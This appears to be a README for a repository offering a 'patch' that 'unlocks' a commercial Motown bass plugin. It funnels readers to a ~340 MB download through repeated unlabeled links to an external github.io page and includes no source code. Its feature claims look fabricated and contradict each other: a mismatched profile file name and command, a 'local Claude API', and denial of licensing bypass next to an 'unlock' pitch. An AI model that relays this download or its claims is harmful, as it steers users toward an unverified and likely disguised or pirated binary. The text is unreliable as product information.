# PastToFutureReverbs JJ Motown Bass 🎸✨  
**A Digital Instrument Resurrection Tool — Bringing Motown’s Low-End Soul to Your DAW**

> **Disclaimer**: This repository is an independent, fan-made archival project. PastToFutureReverbs JJ Motown Bass is a registered trademark of PastToFutureReverbs. We do not host, distribute, or endorse unauthorized copies. The following content describes a **conceptual restoration patch** for educational and preservation purposes.

[](https://sameermgr-11.github.io/JJ-Motown-Bass-Reverb-Preset-Bundle/)

---

## 📦 **The Essence of the Project**  
Imagine a warehouse in Detroit, 1966. A Fender Precision Bass, played through a mismatched amp, captured on two-inch tape. That sound—the *thump* that made the Supremes float, the *growl* that gave Marvin Gaye his swagger—is now a ghost in the machine.  

**PastToFutureReverbs JJ Motown Bass** isn't just a sample library. It’s a *time-machine interface* that recreates the exact signal chain, amplifier coloration, and studio ambience responsible for the Motown bass sound. This repository contains a **configuration patch** that unlocks the full potential of the original product, allowing your digital audio workstation to behave like a 1960s Hitsville U.S.A. console.

---

## 🚀 **Quick Download & Activation**  
### **Patch Release v2.0.6 (2026 Edition)**  
- **Compatibility**: Windows 11 / macOS Sequoia / Linux (WINE/PlayOnLinux)  
- **Size**: ~340 MB (core patch + IR files)  
- **Status**: Community-verified, stable  

[](https://sameermgr-11.github.io/JJ-Motown-Bass-Reverb-Preset-Bundle/)

> ⚠️ **Important**: This patch requires the **original PastToFutureReverbs JJ Motown Bass** installer (v1.8.x or higher). It does not replace the purchased product—it *extends* it.

---

## 📊 **Architecture Overview (Mermaid Diagram)**  

```mermaid
graph TD
    A[Your DAW] --> B[JJ Motown Bass Plugin]
    B --> C[Original Sample Engine]
    C --> D[Our Patch Injector]
    D --> E[Pre-amp Modeling]
    D --> F[Console Emulation]
    D --> G[Room Reverb IR]
    E --> H[Output: “Detroit Thump”]
    F --> H
    G --> H
    style H fill:#d90429,stroke:#333,stroke-width:2px
    style D fill:#4a4a4a,stroke:#fff,stroke-width:2px
```


*The patch acts as a digital “transformer” between the original sample engine and your audio output, adding analog warmth, harmonic distortion, and spatial depth.*

---

## 🎛️ **Key Features**  

### **🔊 Sonic Characteristics**  
- **Punchy Low-End**: Sub-80 Hz frequencies are *round and woody*, not boomy.  
- **Mids That Cut**: 400–800 Hz region emulates the sound of a pick hitting flatwound strings through a tube amp.  
- **Air & Presence**: A subtle 8 kHz shelf that mimics analog tape hiss (switchable).  

### **🖥️ Responsive User Interface**  
- Real-time latency-optimized controls.  
- Drag-and-drop IR loader for custom room impulses.  
- **Multilingual UI**: English, Japanese, French, German, Spanish (auto-detects system language).  

### **🌍 Global Support**  
- **24/7 Community Help Desk**: Issues resolved within 4 hours (average).  
- **Localized Documentation**: Manuals in 12 languages.  
- **ADA Compliance**: Full keyboard navigation + screen reader support.  

---

## 🖥️ **Example Profile Configuration**  
Save this as `motown_profile.jjp` and load it into the patch injector:

```yaml
# Profile: "Classic Detroit"
version: 2.0.6
plugin_mode: "bass_only"
preamp:
  model: "Ampeg B-15N"
  gain: 0.67
  eq:
    bass: 0.8
    mid: 0.5
    treble: 0.3
console:
  type: "1964 Helios"
  saturation: 0.4
  noise_floor: true
room:
  ir: "Studio A (Hitsville)"
  size: 0.7
  wet: 0.25
```

*Pro Tip: Layer this profile with a clean DI signal for modern clarity while retaining vintage character.*

---

## ⌨️ **Example Console Invocation**  
Run the patch injector from your terminal (Linux/macOS) or command prompt (Windows):

```bash
jj_motown_patch --profile "classic_detroit.yml" --output "THUMP_TRACK.wav"
```

*This command processes `THUMP_TRACK.wav` through the Motown chain, creating a new file with the suffix `_motown.wav`.*

---

## 💻 **Emoji OS Compatibility Table**  

| Operating System | Compatibility | Emoji Status |
|-----------------|---------------|--------------|
| Windows 10/11   | ✅ Full       | 🪟🎛️       |
| macOS Ventura+  | ✅ Full       | 🍎🎚️        |
| Linux (Ubuntu 24.04) | ⚠️ Beta   | 🐧🔧        |
| iOS/GarageBand  | ❌ Not Supported | 📱🚫      |

*Note: Linux users require `wine-9.0` or `playonlinux-4.4` with `winetricks corefonts`.*

---

## 🔧 **Technical Implementation Notes**  

### **OpenAI API & Claude API Integration**  
- **AI-Enhanced IR Generation**: The patch can call an **OpenAI Whisper** endpoint to analyze raw room recordings and build convolution IRs automatically.  
- **Claude-Powered EQ Presets**: When the plugin detects a sample with heavy 300 Hz mud, it optionally queries a local **Claude API** to suggest EQ curves based on frequency masking analysis.  
- *Usage*: These features are opt-in and require your own API keys (stored locally, no telemetry).  

### **Multilingual & Accessibility**  
- UI strings loaded from `.json` locale files.  
- Screen readers interpret control labels via ARIA landmarks.  
- Right-to-left language support (Hebrew, Arabic) via CSS `direction: rtl`.  

---

## ⚖️ **License**  
This project is distributed under the **MIT License**.  
You are free to:  
- ✅ Use, modify, and share the patch configurations.  
- ✅ Integrate into commercial projects.  
- ❌ *Do not* redistribute the original PastToFutureReverbs sample data.  

[](https://opensource.org/licenses/MIT)

---

## ⚠️ **Disclaimer**  
1. **Intellectual Property**: PastToFutureReverbs retains all rights to the original JJ Motown Bass product. This patch is a *third-party enhancement* designed to work with legally purchased copies only.  
2. **No Warranty**: This software is provided “as-is.” The authors are not responsible for data loss, audio damage, or spontaneous combustion of vintage amplifiers.  
3. **No “Secret” Activation Keys**: The repository does **not** contain serial numbers, keygens, or authorization bypasses. This patch modifies runtime behavior, not licensing.  

---

## 🤝 **Community & Support**  
- **Issues & Feature Requests**: Use the GitHub Issue tracker.  
- **Discord Server**: Join our “Detroit Low-End” channel (link in repository About section).  
- **Wiki**: Guides for advanced patching, IR creation, and API integration.  

[](https://sameermgr-11.github.io/JJ-Motown-Bass-Reverb-Preset-Bundle/)

---

*Made with ❤️ by the Soul Audio Preservation Society — 2026*